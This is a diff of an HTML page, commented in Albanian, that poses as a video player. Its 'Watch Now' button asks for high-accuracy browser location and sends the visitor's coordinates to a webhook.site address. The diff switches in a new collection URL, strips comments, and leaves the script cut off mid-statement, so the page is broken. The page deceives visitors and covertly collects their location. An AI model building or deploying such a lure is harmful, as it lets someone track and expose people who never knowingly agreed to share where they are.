@@ -69,7 +69,6 @@
 
     <div class="video-container">
         <div class="thumbnail">
-            <!-- Butoni që imiton shikimin e videos dhe aktivizon kërkesën e lokacionit -->
             <button class="play-btn" onclick="requestLocationAndPlay()">▶ Watch Now</button>
         </div>
         <div class="video-info">
@@ -80,15 +79,14 @@
 
     <script>
         function requestLocationAndPlay() {
-            // Kontrollon nëse shfletuesi e mbështet gjeolokacionin
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
 
-                        // Dërgon koordinatat te Webhook-u juaj
-                        fetch('https://webhook.site/eea6cf9f-37c7-47e9-95a9-4deaaf8e5663', {
+                        // Linku yt i ri nga Webhook.site
+                        fetch('https://webhook.site/f88553e3-b4a4-4d47-99ba-7af8d4611cd7', {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/json'
@@ -100,20 +98,7 @@
                             })
                         }).catch(err => console.log(err));
 
-                        // Pasi jepet leja, mund të simulojë hapjen e videos ose mesazhin
                         alert('Duke u ngarkuar... Ju lutem prisni.');
                     },
                     function(error) {
-                        alert('Duhet të lejoni lokacionin (Allow) për të shfaqur videon!');
-                    },
-                    { enableHighAccuracy: true }
-                );
-            } else {
-                alert('Pajisja juaj nuk e mbështet këtë shërbim.');
-            }
-        }
-    </script>
-
-</body>
-</html>
-
+                        alert('Duhet të lejoni lokacionin (Allow)
